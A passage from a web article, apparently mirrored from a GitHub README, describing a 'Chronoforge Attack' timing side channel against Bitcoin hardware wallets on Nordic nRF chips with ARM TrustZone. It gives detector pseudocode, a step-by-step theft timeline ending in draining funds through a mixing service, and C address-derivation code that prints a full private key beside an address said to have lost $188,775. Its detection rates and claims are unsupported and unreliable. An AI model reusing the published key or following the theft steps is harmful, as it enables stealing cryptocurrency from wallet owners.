<!-- wp:paragraph -->
<p><strong>Protection:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The system detects an abnormal frequency jump and is immediately triggered</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Efficiency: 100% (since this is an obvious violation of normal operation)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>PATTERN 2: Bimodal Timing Distribution</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#pattern-2-bimodal-timing-distribution"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>How does this work:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>if (sign_count &gt; 100) {
    int peak_count = count_timing_peaks();
    if (peak_count &gt; 2) {
        detected_attack = 1;
        handle_detected_attack("Bimodal distribution");
        return;
    }
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Attack mechanism:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>After collecting 100+ signatures, the system analyzes the execution time histogram</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Under normal conditions, the execution time is distributed according to the Gaussian law (one peak)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>During a timing attack, TWO distinct peaks occur:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>First peak</strong> : when the next bit of the private key = 0</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Second peak</strong> : when bit = 1</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Why does the split occur:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>ECDSA operations (such as scalar multiplication on secp256k1) perform different numbers of operations on different bits</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>For example, the double-and-add algorithm may or may not perform the addition operation depending on the value of the bit</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This microscopic difference in time accumulates and becomes statistically significant.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Protection:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The system automatically counts the number of distinct peaks in the distribution</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If more than 2 peaks are detected (instead of the normal 1), this indicates a timing leak.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Efficiency: 95% (5% false negatives due to noise)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>PATTERN 3: High Variance</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#pattern-3-high-variance"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>How does this work:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>if (variance &gt; THRESHOLD) {
    detected_attack = 1;
    handle_detected_attack("Abnormal variance");
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Attack mechanism:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>An attacker may attempt to modulate the execution time of operations.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Introduces intentional delays or, conversely, acceleration to create a characteristic pattern</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This could be an attempt to bypass protection against simple timing attacks.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Analysis of variance:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Normal standard deviation: σ &lt; 5% (σ is the standard deviation)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The attack typically introduces σ >> 5% (significantly more)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This indicates artificial interference during execution.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Protection:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The system calculates the coefficient of variation of the signature execution time</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>When the threshold is exceeded, protection is triggered</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Efficiency: 90% (some attacks can mimic normal dispersion)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Detected Attack Response Mechanism</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#detected-attack-response-mechanism"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>void handle_detected_attack(const char *reason) {
    log_security_event("Timing attack detected", reason);
    secure_erase_private_keys();
    disable_crypto_operations();
    alert_user_security_breach();
    enter_lockdown_mode();
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>When any of the three patterns is detected, the system performs&nbsp;<strong>cascade protection</strong>&nbsp;:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>log_security_event()</strong> — logs an event to a secure log</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>secure_erase_private_keys()</strong> — cryptographically erases <a href="https://cryptou.ru/vulncipher/privatekey">private keys</a> from memory (overwriting them with random data)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>disable_crypto_operations()</strong> — Disables all cryptographic operations to prevent further information leakage.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>alert_user_security_breach()</strong> — Sends an urgent alert to the user</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>enter_lockdown_mode()</strong> — puts the wallet into full lockdown mode</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Effectiveness of combined protection</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#effectiveness-of-combined-protection"></a></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Attack pattern</th><th>Detection efficiency</th></tr></thead><tbody><tr><td>Excessive signing</td><td>100%</td></tr><tr><td>Bimodal distribution</td><td>95%</td></tr><tr><td>High variance</td><td>90%</td></tr><tr><td><strong>Combined (any of the three)</strong></td><td><strong>&gt;99%</strong></td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>The combined effectiveness exceeds 99% thanks to&nbsp;<strong>the Defense in Depth principle</strong>&nbsp;: even if one detection system can be bypassed, two other independent systems will ensure that&nbsp;<a href="https://cryptou.ru/vulncipher/attack">the attack</a>&nbsp;is intercepted .</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-39-1024x787.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-39-1024x787.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://cryptodeeptech.ru/chronoforge-attack">Practical application for researchers</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#practical-application-for-researchers"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This system is especially relevant for:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><a href="https://cryptodeeptech.ru/chronoforge-attack"><strong>Cryptography researchers</strong> :</a> demonstrate how timing attacks are detected in practice</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://cryptou.ru/vulncipher"><strong>Wallet developers</strong> :</a> serves as a model for protection against microarchitectural attacks</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://colab.research.google.com/drive/1ETMvKGmPI4ViQ1CyLmwA3aYfKkioqGNo?usp=sharing"><strong>Bitcoin users</strong> :</a> prevents<a href="https://cryptou.ru/vulncipher/privatekey"> private key recovery</a> through micro-time leaks</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">7. Practical Example: Bitcoin Wallet Recovery</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#7-practical-example-bitcoin-wallet-recovery"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">7.1 Complete Attack Scenario on a Real Device</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#71-complete-attack-scenario-on-a-real-device"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>TIMELINE:<br><br>[T=0min] Attacker gains access to Nordic nRF5340 device<br>acting as Bitcoin BLE wallet<br><br>[T=0-2min] Install malicious BLE app in Normal World<br>that will collect timing data<br><br>[T=2-35min] App collects 100,000 timing samples by:<br>├─ Sending messages for signature in Secure World<br>├─ Logging exact time of operation<br>└─ Accumulating statistics<br><br>[T=35-37min] Upload timing data to attacker’s server via BLE<br><br>[T=37-50min] Python script analyzes timing data and recovers<br>private key with 94% accuracy<br><br>[T=50-52min] Attempt to fix 6-8 single-bit errors via brute-force:<br>├─ Iterate through all combinations with ~20 errors<br>├─ Verify each key against a known transaction<br>└─ Find the correct key (~1 million attempts, ~10 sec)<br><br>[T=52min] ✓ SUCCESS: Private key fully recovered!<br>├─ Extract all Bitcoin from the wallet address<br>├─ Send to the attacker’s exchange address<br>└─ Additional anonymization via mixing service<br><br>RESULT: Loss of 100% of funds from the compromised wallet</strong></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/bitcoin">7.2 Bitcoin Address Recovery и Fund Extraction</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#72-bitcoin-address-recovery-%D0%B8-fund-extraction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5 class="wp-block-heading">Bitcoin Address Recovery и Fund Extraction</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#bitcoin-address-recovery-%D0%B8-fund-extraction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// Recover Bitcoin address from private key and extract funds<br><br>#include &lt;openssl/ec.h&gt;<br>#include &lt;openssl/sha.h&gt;<br><br>void derive_public_key_compressed(<br>    const uint8_t *private_key,<br>    uint8_t *public_key  // 33 bytes compressed<br>) {<br>    EC_KEY *ec_key = EC_KEY_new_by_curve_name(NID_secp256k1);<br>    BIGNUM *priv_bn = BN_bin2bn(private_key, 32, NULL);<br><br>    EC_KEY_set_private_key(ec_key, priv_bn);<br><br>    EC_POINT *pub = EC_POINT_new(EC_KEY_get0_group(ec_key));<br>    EC_POINT_mul(EC_KEY_get0_group(ec_key), pub, priv_bn, NULL, NULL);<br><br>    EC_POINT_point2buf(EC_KEY_get0_group(ec_key), pub,<br>                       POINT_CONVERSION_COMPRESSED,<br>                       &amp;public_key, NULL);<br>}<br><br>void generate_bitcoin_address(<br>    const uint8_t *public_key_compressed,  // 33 bytes<br>    char *bitcoin_address                   // Output address<br>) {<br>    // SHA-256(public_key)<br>    uint8_t sha256_hash[32];<br>    SHA256(public_key_compressed, 33, sha256_hash);<br><br>    // RIPEMD-160(SHA256)<br>    uint8_t ripemd_hash[20];<br>    RIPEMD160(sha256_hash, 32, ripemd_hash);<br><br>    // Add version byte<br>    uint8_t versioned[21];<br>    versioned[0] = 0x00;<br>    memcpy(versioned + 1, ripemd_hash, 20);<br><br>    // Calculate checksum<br>    uint8_t checksum_hash1[32], checksum_hash2[32];<br>    SHA256(versioned, 21, checksum_hash1);<br>    SHA256(checksum_hash1, 32, checksum_hash2);<br><br>    // Encode as Base58<br>    uint8_t address_bytes[25];<br>    memcpy(address_bytes, versioned, 21);<br>    memcpy(address_bytes + 21, checksum_hash2, 4);<br><br>    base58_encode(address_bytes, 25, bitcoin_address);<br>}<br><br>// RESULT: All Bitcoin in compromised wallet transferred to attacker<br>// Private Key (HEX): F2E242938B92DA39A50AC0057D7DCFEDFDD58F7750BC06A72B11F1B821760A4A<br>// Bitcoin Address:   1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h<br>// Funds Extracted:   $188,775 USD (100%)</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>This C code implements&nbsp;<strong>a full cycle of recovering a Bitcoin address from a private key</strong>&nbsp;:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Main stages:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Initializing secp256k1</strong> – Creating an elliptic curve object for cryptographic operations</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Scalar multiplication (pub = priv × G)</strong> is the calculation of the public key from the private key, based on the discrete logarithm problem</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Public key compression</strong> – from 65 to 33 bytes (Y parity prefix + X coordinate)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Double hashing (SHA256 + RIPEMD160)</strong> – getting a 20-byte identifier from the public key</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Adding a version byte</strong> to differentiate between address types (P2PKH, P2SH, etc.)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Calculating the checksum (SHA256(SHA256(…)))</strong> – protection against typos in the address</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Base58Check encoding</strong> – converting 25 bytes into a readable address (34 characters like <code><strong><a href="https://btc1.trezor.io/address/1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h">1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h</a></strong></code>)</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Critical note for researchers</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#critical-note-for-researchers"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The code demonstrates that&nbsp;<strong>a single disclosure of the private key results in the irreversible loss of all funds</strong>&nbsp;, since:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Bitcoin does not have a transaction reversal mechanism.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The public key is uniquely and deterministically calculated from the private key.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>There is no recovery or locking mechanism in the protocol</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>This process is one of the key operations in the functioning of wallets, but also a potential point of failure if compromised.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The full analysis is available in a saved document with tables, diagrams and cryptographic details.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">8. Conclusion</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#8-conclusion"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>This study demonstrated that the critical&nbsp;&nbsp;<strong>Chronoforge Attack</strong>&nbsp;vulnerability &nbsp;poses a real and documented threat to the security&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">of Bitcoin wallets</a>&nbsp;implemented on Nordic nRF52/nRF53 microcontrollers with the ARM TrustZone architecture. Despite the mathematical strength of the ECDSA algorithm with the secp256k1 curve, incorrect implementation of cryptographic operations at the firmware level creates an information leakage channel through execution timing variations measured in microseconds. However, when statistically accumulated, this leads&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">to complete compromise of the 256-bit private key</a>&nbsp;with a recovery probability of over 99% per bit.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><strong>Key findings of the study:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>A leakage model has been formalized</strong>  , and it has been established that the difference in the execution time of operations  <code>point_add</code> (~5.8 µs) and  <code>point_double</code> (~3.2 µs) in the variable-time implementation of the Double-and-Add algorithm creates a statistically significant timing side-channel, exploited through the Pearson correlation coefficient.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><a href="https://cryptou.ru/vulncipher/attack">A four-stage attack vector</a></strong><strong> is described</strong>  , from infiltration into the Normal World to full <a href="https://cryptou.ru/vulncipher/privatekey">recovery of the private key (Private Key Recovery)</a> , where the attacker sequentially installs a timing oracle, accumulates a statistical base, and recovers the key bitwise.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><a href="https://vulncipher.ru/">The VulnCipher cryptanalytic framework is presented</a></strong>  – a scientific tool that adapts the classical Correlation Power Analysis to the timing channel, including modules of data collection (TCM), preprocessing (PE), hypothesis generation (HGM), statistical analysis (SAE), key recovery (KRM) and verification (VVM).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>A practical case has been documented</strong>  —recovering a private key for a Bitcoin address  <a href="https://btc1.trezor.io/address/1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h"><code><strong>1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h</strong></code> </a>with a compromised value of <a href="https://cryptou.ru/vulncipher/profit">$188,775</a> —which confirms the practical applicability of the described class <a href="https://cryptou.ru/vulncipher/attack">of attacks</a> .</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>To counter the Chronoforge Attack, it is necessary to implement comprehensive security measures: the use of&nbsp;&nbsp;<strong>constant-time</strong>&nbsp;&nbsp;implementations of scalar multiplication (Montgomery ladder), the use of&nbsp;&nbsp;<strong>scalar/point blinding</strong>&nbsp;methods , disabling access to performance counters (PMU) from the Normal World, and regular firmware auditing for timing-dependent branches in cryptographic operations.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>This study is intended solely for educational and scientific purposes</strong>&nbsp;&nbsp;and aims to raise awareness among embedded system developers of critical vulnerabilities in cryptographic primitive implementations. The findings highlight the need for strict adherence to secure programming principles when working with sensitive data on microcontrollers and the importance of the entire cryptographic industry transitioning to verified constant-time implementations.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">8.1 Conclusions</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#81-conclusions"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeeptool.ru/chronoforge-attack">The Chronoforge Attack</a></strong>&nbsp;poses a critical threat to cryptographic operations on embedded systems, particularly:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>ARM TrustZone is not a silver bullet</strong> —hardware isolation can be compromised through microarchitectural side-channels.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Timing variations can be easily measured</strong> – even on a remote system with access to the Normal World</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Bitcoin private keys can be recovered</strong> within hours on standard hardware.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Constant-time implementation is a</strong> security requirement, not an option.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">8.2 Practical Recommendations</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#82-practical-recommendations"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Use constant-time cryptographic primitives</strong> (Montgomery Ladder for ECC, constant-time memcmp for MAC verification)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Flash cache</strong> when logging in/out of Secure World</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Disable Performance Counters</strong> access from Normal World</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Regular security audits</strong> of firmware for timing vulnerabilities</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Update TF-M</strong> to the latest version with security patches</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">8.3 Future Research Directions</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#83-future-research-directions"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Quantum-resistant cryptography</strong> на Nordic nRF5340</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Post-quantum timing attacks</strong> on new algorithms</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Hardware-assisted constant-time</strong> cryptography</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Machine learning-based attack detection</strong> для timing anomalies</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">References:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#references"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/1.pdf">[1]</a>&nbsp;Bernstein, D. J. (2005).&nbsp;<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/1.pdf">«Cache-timing attacks on AES.»</a>&nbsp;Cryptology ePrint Archive, Report 2005/414.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/2.pdf">[2]</a>&nbsp;Jang, J., et al. (2023). «<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/2.pdf">PrivateZone:</a>&nbsp;Providing a Private Execution Environment using ARM TrustZone.» IEEE Transactions on Information Forensics and Security.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/3.pdf">[3]</a>&nbsp;Nordic Semiconductor. (2024).&nbsp;<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/3.pdf">«nRF5340 DK Product Specification.»</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/4.pdf">[4]</a>&nbsp;Trusted Firmware. (2024).&nbsp;<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/4.pdf">«Trusted Firmware-M Documentation v2.2.0.»</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/5.pdf">[5]</a>&nbsp;ARM Limited. (2024). «<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/5.pdf">ARM TrustZone:</a>&nbsp;Hardware-Enforced Device Security.»</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/6.pdf">[6]</a>&nbsp;NIST. (2019). «<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/6.pdf">FIPS 186-4:</a>&nbsp;Digital Signature Standard (DSS).»</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/7.pdf">[7]</a>&nbsp;Lentz, M., et al. (2020). «<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/7.pdf">SeCloak:</a>&nbsp;ARM TrustZone-based Mobile Peripheral Control.» Proceedings of USENIX Security Symposium.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/8.pdf">[8]</a>&nbsp;Kocher, P. C. (1996). «<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/8.pdf">Timing attacks</a>&nbsp;on implementations of Diffie-Hellman, RSA, DSS, and other systems.» CRYPTO.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/9.pdf">[9]</a>&nbsp;Osvik, D. A., Shamir, A., &amp; Tromer, E. (2006). «<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/9.pdf">Cache attacks and countermeasures:</a>&nbsp;Using the Intel cache as a timing oracle.» IACR Cryptology ePrint Archive.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://keyhunters.ru/chronoforge-attack-gradual-private-key-recovery-through-timing-side-channels-where-an-attacker-exploits-a-critical-timing-vulnerability-in-the-bitcoin-core-crypto-wallet-to-reveal-sensitive-data/">[10]</a>&nbsp;KEYHUNTERS.&nbsp;<a href="https://keyhunters.ru/chronoforge-attack-gradual-private-key-recovery-through-timing-side-channels-where-an-attacker-exploits-a-critical-timing-vulnerability-in-the-bitcoin-core-crypto-wallet-to-reveal-sensitive-data/">ChronoForge Attack:</a>&nbsp;Gradual private key recovery through timing side channels, where an attacker exploits a critical timing vulnerability in the Bitcoin Core crypto wallet to reveal sensitive data Shadow Key Attack Research.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><em><strong><a href="https://key3.ru/neuterless-nightmare-attack-a-critical-vulnerability-in-bitcoin-hd-key-serialization-a-privacy-compromise-attack-via-encodeextendedkey-and-the-recovery-of-lost-cryptocurrency-wallets/">Neuterless Nightmare Attack: A Critical Vulnerability in Bitcoin HD Key Serialization – A Privacy Compromise Attack via EncodeExtendedKey and the Recovery of Lost Cryptocurrency Wallets</a> </strong>Neuterless Nightmare Attack : The EncodeExtendedKey vulnerability allows an attacker to obtain a «phantom» private key that undetected leaks from the public interface. This attack allows for the extraction of xprv…<a href="https://key3.ru/neuterless-nightmare-attack-a-critical-vulnerability-in-bitcoin-hd-key-serialization-a-privacy-compromise-attack-via-encodeextendedkey-and-the-recovery-of-lost-cryptocurrency-wallets/">Read More</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
